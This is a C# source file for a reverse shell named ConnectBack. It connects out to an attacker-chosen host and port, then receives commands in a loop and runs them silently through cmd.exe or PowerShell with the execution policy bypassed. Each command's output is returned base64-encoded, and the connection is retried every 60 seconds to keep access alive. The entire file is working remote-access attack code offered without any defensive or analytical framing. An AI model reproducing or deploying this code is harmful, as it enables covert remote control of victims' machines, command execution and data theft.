using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
using System.Text;

namespace ConnectBack
{
    public class Program
    {
        public static int Main(string[] args)
        {
            string host = args[0];
            int port = int.Parse(args[1]);
            string initialData = args[2];
            bool shouldTerminate = false;
            bool shouldRetry = true;

            while (shouldRetry && !shouldTerminate)
            {
                shouldRetry = false;

                TcpClient client = null;
                NetworkStream stream = null;
                StreamWriter writer = null;
                StreamReader reader = null;

                try
                {
                    Console.WriteLine("Attempting to connect to " + host + ":" + port);
                    client = new TcpClient(host, port);
                    stream = client.GetStream();
                    writer = new StreamWriter(stream) { AutoFlush = true };
                    reader = new StreamReader(stream);

                    // Send initial data
                    writer.WriteLine(Convert.ToBase64String(Encoding.UTF8.GetBytes(initialData)));
                    Console.WriteLine("Initial data sent: " + initialData);

                    // Keep the connection open and listen for commands
                    while (true)
                    {
                        string command = reader.ReadLine();
                        if (command == null)
                        {
                            Console.WriteLine("Connection interrupted.");
                            throw new IOException(); // Throw a simple IOException
                        }

                        if (command.ToLower() == "quit")
                        {
                            shouldTerminate = true;
                            return 4; // Return 4 to indicate "quit" was received
                        }

                        // Execute the command
                        string output = ExecuteCommand(command);

                        // Encode the output in base64
                        string base64Output = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                        writer.WriteLine(base64Output);
                    }
                }
                catch (SocketException)
                {
                    Console.WriteLine("Socket error occurred.");
                    shouldRetry = true;
                }
                catch (IOException)
                {
                    Console.WriteLine("IO error occurred.");
                    shouldRetry = true;
                }
                catch (Exception)
                {
                    Console.WriteLine("General error occurred.");
                    shouldRetry = true;
                }
                finally
                {
                    // Close the connection properly
                    if (writer != null) writer.Close();
                    if (reader != null) reader.Close();
                    if (stream != null) stream.Close();
                    if (client != null) client.Close();
                }

                if (shouldRetry && !shouldTerminate)
                {
                    // Wait before retrying
                    Console.WriteLine("Retrying in 60 seconds...");
                    System.Threading.Thread.Sleep(60000);
                }
            }

            return 0; // Return 0 to indicate success
        }

        private static string ExecuteCommand(string command)
        {
            try
            {
                using (Process process = new Process())
                {
                    if (command.Trim().StartsWith("powershell") || command.Trim().StartsWith("ps"))
                    {
                        process.StartInfo.FileName = "powershell.exe";
                        process.StartInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"" + command.Substring(command.IndexOf(' ') + 1).Trim().Replace("\"", "\\\"") + "\"";
                    }
                    else
                    {
                        process.StartInfo.FileName = "cmd.exe";
                        process.StartInfo.Arguments = "/c " + command;
                    }

                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();

                    // Capture both standard output and error
                    string result = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    return result + error; // Return the combined output and error
                }
            }
            catch (Exception e)
            {
                return "Error executing command: " + e.Message;
            }
        }

        private static void SendError(StreamWriter writer, string errorMessage)
        {
            string base64Error = Convert.ToBase64String(Encoding.UTF8.GetBytes(errorMessage));
            writer.WriteLine(base64Error);
        }
    }
}